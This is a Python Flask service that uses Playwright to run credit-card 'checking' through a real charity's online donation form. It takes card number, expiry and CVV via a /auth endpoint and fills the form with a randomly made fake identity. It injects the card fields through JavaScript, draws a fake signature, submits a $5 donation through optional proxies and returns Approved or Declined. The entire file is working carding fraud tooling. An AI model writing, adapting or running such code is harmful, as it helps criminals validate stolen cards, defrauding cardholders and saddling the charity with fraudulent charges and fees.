import asyncio
import re
import time
import random
import textwrap
import os 
import logging as flask_logging
from flask import Flask, request, jsonify
from playwright.async_api import async_playwright

app = Flask(__name__)

class Colors:
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'

def bot_log(step, message, emoji=""):
    color = Colors.CYAN
    if step in ["ERROR", "FAIL"]: 
        color = Colors.RED
    elif step in ["SCAN", "DONE", "FILL", "VALID"]: 
        color = Colors.GREEN
        if "DECLINED" in message.upper():
            color = Colors.RED
            emoji = "[❌]"
    elif step in ["BANK", "CONF"]: 
        color = Colors.YELLOW
        if "DECLINED" in message.upper() or "HIGH RISK" in message.upper():
            color = Colors.RED

    tag = f"[{step:<5}]"
    if len(message) > 80:
        wrapped_lines = textwrap.wrap(message, width=80)
        print(f"{color}{tag} » {wrapped_lines[0]} {emoji}{Colors.RESET}")
        for line in wrapped_lines[1:]:
            print(f"{color}        {line}{Colors.RESET}")
    else:
        print(f"{color}{tag} » {message} {emoji}{Colors.RESET}")

def print_separator():
    print(f"\n{Colors.CYAN}{'='*15} API BY UNIX DEV TEAM {'='*15}{Colors.RESET}\n")

def generate_fake_identity():
    first_names = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "William", "Elizabeth"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
    
    rand_first = random.choice(first_names)
    rand_last = random.choice(last_names)
    
    domains = ["@gmail.com", "@yahoo.com", "@outlook.com", "@icloud.com"]
    email = f"{rand_first.lower()}.{rand_last.lower()}{random.randint(10, 99)}{random.choice(domains)}"
    
    streets = ["Main St", "Oak Ave", "Maple Dr", "Cedar Ln", "Elm St", "Pine Rd"]
    street_num = random.randint(100, 9999)
    
    return {
        "first_name": rand_first,
        "last_name": rand_last,
        "email": email,
        "address": f"{street_num} {random.choice(streets)}",
        "city": "Portland",
        "state": "Oregon",
        "zip": "97035",
        "phone": f"({random.randint(200, 899)}) {random.randint(200, 899)}-{random.randint(1000, 9999)}"
    }

async def process_nhscot_donation(cc, mm, yy, cvv, proxy_str=None):
    start_time = time.time()
    detected_price = "5.00"
    
    fake_id = generate_fake_identity()
    bot_log("INIT", f"Generated Identity: {fake_id['first_name']} {fake_id['last_name']}", "[👤]")
    
    async with async_playwright() as p:
        launch_args = {"headless": False}
        context_args = {"ignore_https_errors": True}
        
        if proxy_str:
            try:
                auth_part = proxy_str.split('@')[0]
                server_part = proxy_str.split('@')[1].split(':')[0]
                port_part = proxy_str.split('@')[1].split(':')[1]
                
                proxy_config = {
                    "server": f"http://{server_part}:{port_part}",
                    "username": auth_part.split(':')[0],
                    "password": auth_part.split(':')[1]
                }
                launch_args["proxy"] = proxy_config
                bot_log("INIT", f"Using Proxy: {server_part}:{port_part}", "[🌐]")
            except:
                pass

        browser = await p.chromium.launch(**launch_args)
        context = await browser.new_context(**context_args)
        page = await context.new_page()
        
        await page.route("**/*.{png,jpg,jpeg,gif,svg}", lambda route: route.abort())
        
        target_url = "https://nhscot.org/support-us/donate/"
        bot_log("INIT", f"Target -> {target_url}", "")

        try:
            # PERINGKAT 1: Pergi ke halaman donasi
            bot_log("POST", "Step 1: Navigating to Donation Form...", "[🚀]")
            await page.goto(target_url, timeout=60000, wait_until="domcontentloaded")
            
            # Tunggu borang Gravity Forms load
            bot_log("WAIT", "Waiting for Form to render...", "[⏳]")
            await page.wait_for_selector("input[name='input_13.3']", timeout=30000)
            
            # PERINGKAT 2: Isi Borang (Laju & Tepat)
            bot_log("POST", "Step 2: Filling Form Details (Fast Mode)...", "[⚡]")
            
            # 1. Radio Buttons (Donation Type & Campaign)
            try: await page.check("input[name='input_18'][value='One-time Donation']")
            except: pass
            try: await page.check("input[name='input_5'][value='Capital Campaign']")
            except: pass
            try: await page.check("input[name='input_6'][value='No']")
            except: pass
            
            # Pilih Other Amount guna Dropdown Select
            try:
                await page.select_option("select[name='input_19']", "Other|0")
                await asyncio.sleep(0.5)
                await page.fill("input[name='input_20']", "$5.00")
                bot_log("SCAN", "Selected Amount: Other -> $5.00", "[💰]")
            except Exception as e:
                bot_log("ERROR", f"Failed to select Other amount: {str(e)}", "[❌]")
            
            # 2. Personal Info
            await page.fill("input[name='input_13.3']", fake_id['first_name'])
            await page.fill("input[name='input_13.6']", fake_id['last_name'])
            await page.fill("input[name='input_14.1']", fake_id['address'])
            await page.fill("input[name='input_14.3']", fake_id['city'])
            await page.fill("input[name='input_14.4']", fake_id['state'])
            await page.fill("input[name='input_14.5']", fake_id['zip'])
            await page.fill("input[name='input_16']", fake_id['email'])
            await page.fill("input[name='input_15']", fake_id['phone'])
            
            # PERINGKAT 3: CC Details (AI Smart Locator)
            bot_log("WAIT", "Step 3: Filling CC Details...", "[💳]")
            
            if len(yy) == 4:
                yy = yy[-2:]
            
            js_fill_cc = f"""() => {{
                let filledCount = 0;
                
                const ccSection = document.querySelector('#field_72_10') || document.querySelector('.gfield_creditcard');
                if (!ccSection) return 0;
                
                const ccInput = ccSection.querySelector("input[name='input_10.1'], input[name*='cardnumber'], input[type='text']");
                if (ccInput) {{
                    ccInput.value = '{cc}';
                    ccInput.dispatchEvent(new Event('input', {{ bubbles: true }}));
                    ccInput.dispatchEvent(new Event('change', {{ bubbles: true }}));
                    filledCount++;
                }}
                
                const selects = ccSection.querySelectorAll('select');
                if (selects.length >= 2) {{
                    selects[0].value = '{mm}';
                    selects[0].dispatchEvent(new Event('change', {{ bubbles: true }}));
                    selects[1].value = '20{yy}';
                    selects[1].dispatchEvent(new Event('change', {{ bubbles: true }}));
                    filledCount += 2;
                }} else if (selects.length === 1) {{
                    selects[0].value = '{mm}20{yy}';
                    selects[0].dispatchEvent(new Event('change', {{ bubbles: true }}));
                    filledCount++;
                }}
                
                const inputs = ccSection.querySelectorAll("input[type='text'], input[type='tel'], input[type='password']");
                for(let inp of inputs) {{
                    if(inp.name.includes('10.3') || inp.name.includes('cvc') || inp.name.includes('seccode')) {{
                        inp.value = '{cvv}';
                        inp.dispatchEvent(new Event('input', {{ bubbles: true }}));
                        inp.dispatchEvent(new Event('change', {{ bubbles: true }}));
                        filledCount++;
                        break;
                    }}
                }}
                
                return filledCount;
            }}"""
            
            try:
                filled = await page.evaluate(js_fill_cc)
                bot_log("SCAN", f"Filled {filled} CC fields.", "[✅]")
            except Exception as e:
                bot_log("ERROR", f"JS CC Injection failed: {str(e)}", "[❌]")
            
            # Signature (Guna Playwright Mouse + Trigger Gravity Forms Event)
            try:
                sig_canvas = page.locator("#field_72_17 canvas, .gform_wrapper canvas, canvas").first
                
                if await sig_canvas.is_visible(timeout=2000):
                    bot_log("POST", "Drawing Signature on Canvas...", "[✍️]")
                    
                    box = await sig_canvas.bounding_box()
                    if box:
                        start_x = box['x'] + box['width'] / 4
                        start_y = box['y'] + box['height'] / 2
                        
                        await page.mouse.move(start_x, start_y)
                        await page.mouse.down()
                        await page.mouse.move(start_x + 20, start_y - 20)
                        await page.mouse.move(start_x + 40, start_y + 10)
                        await page.mouse.move(start_x + 60, start_y - 15)
                        await page.mouse.move(start_x + 80, start_y + 20)
                        await page.mouse.move(start_x + 100, start_y - 10)
                        await page.mouse.up()
                        
                        await asyncio.sleep(1)
                        
                        await page.evaluate("""() => {
                            const sigCanvas = document.querySelector('canvas');
                            const sigInput = document.querySelector("input[name='input_72_17_data'], input[name*='signature'], input[name*='_data']");
                            if (sigCanvas && sigInput) {
                                sigInput.value = sigCanvas.toDataURL();
                                sigInput.setAttribute('value', sigInput.value);
                                sigInput.dispatchEvent(new Event('input', { bubbles: true }));
                                sigInput.dispatchEvent(new Event('change', { bubbles: true }));
                                document.body.dispatchEvent(new CustomEvent('gform_signature_field_changed', { detail: { canvas: sigCanvas, input: sigInput } }));
                            }
                        }""")
                        bot_log("SCAN", "Signature Drawn & Event Triggered!", "[✅]")
            except Exception as e:
                bot_log("ERROR", f"Signature drawing failed: {str(e)}", "[⚠️]")
            
            # PERINGKAT 4: Tekan Butang Submit
            bot_log("POST", "Step 4: Clicking Submit Button...", "[🚀]")
            await asyncio.sleep(1)
            
            try:
                await page.click(".gform_button.button", timeout=5000)
            except:
                try:
                    await page.click("input[name='gform_submit'][value='72']", timeout=5000)
                except:
                    try:
                        await page.click("input[type='submit']", timeout=5000)
                    except:
                        await page.evaluate("document.getElementById('gform_72').submit();")
            
            # =====================================================================
            # PERINGKAT 5: Tunggu Result (Original Message Extractor)
            # =====================================================================
            bot_log("WAIT", "Step 5: Waiting for Bank Response...", "[⏳]")
            
            is_approved = False
            error_text = "Unknown Response"
            
            try:
                await page.wait_for_selector(".gfield_validation_message, .validation_message", timeout=30000)
                
                error_element = await page.query_selector(".gfield_validation_message, .validation_message")
                if error_element:
                    raw_error_msg = await error_element.inner_text()
                    
                    raw_error_msg = raw_error_msg.strip().replace("\n", " ")
                    
                    if len(raw_error_msg) > 150:
                        error_text = raw_error_msg[:150] + "..."
                    else:
                        error_text = raw_error_msg
                        
                    if "thank you" in raw_error_msg.lower() or "success" in raw_error_msg.lower():
                        is_approved = True
                    else:
                        is_approved = False
                        
            except:
                await asyncio.sleep(5)
                page_content = (await page.content()).lower()
                
                if "thank you" in page_content or "success" in page_content:
                    is_approved = True
                    error_text = "Approved (Donation Received)"
                else:
                    is_approved = False
                    error_text = "Timeout / Unknown Response"
                    
            bot_log("BANK", error_text, "[⚠️]")
            bot_log("DONE", "Process Completed", "[✅]")
            
            await browser.close()
            time_taken = round(time.time() - start_time, 2)
            return is_approved, error_text, detected_price, time_taken
            
        except Exception as e:
            bot_log("ERROR", f"Process Failed: {str(e)}", "[❌]")
            try:
                await page.screenshot(path="error_screenshot.png")
                bot_log("ERROR", "Screenshot saved to error_screenshot.png", "[📸]")
            except:
                pass
            await browser.close()
            time_taken = round(time.time() - start_time, 2)
            return False, f"Process Failed: {str(e)}", "0.00", time_taken


@app.route('/auth', methods=['GET'])
def handle_auth():
    start_time = time.time()
    cc_param = request.args.get('cc')
    proxy_param = request.args.get('proxy')

    if cc_param:
        short_cc = cc_param.split('|')[0]
        bot_log("INFO", f"Received Request -> {short_cc}", "[📩]")

    if not cc_param:
        return jsonify({"error": "Missing 'cc' parameter"}), 400

    try:
        parts = cc_param.split('|')
        if len(parts) != 4:
            return jsonify({"error": "Invalid 'cc' format. Expected: number|mm|yy|cvv"}), 400
        cc, mm, yy, cvv = parts
    except Exception as e:
        return jsonify({"error": "Error parsing 'cc' parameter: " + str(e)}), 400

    try:
        success, message, detected_price, time_taken = asyncio.run(
            process_nhscot_donation(cc, mm, yy, cvv, proxy_param)
        )
    except Exception as e:
        success = False
        message = 'Server exception: ' + str(e)
        detected_price = "0.00"
        time_taken = round(time.time() - start_time, 2)

    result_status = "Approved" if success else "Declined"
    response_msg = re.sub(r'^Error\s*:\s*', '', message, flags=re.I).strip()

    print_separator()

    return jsonify({
        "Gateway": "NHSCOT Gravity Forms (Playwright)",
        "Price": detected_price,
        "Result": result_status,
        "Response": response_msg,
        "Status": success,
        "Time": f"{time_taken}s",
        "form_id": "N/A",
        "cc": cc_param
    })

if __name__ == "__main__":
    flask_logging.getLogger('werkzeug').setLevel(flask_logging.ERROR)
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=True)
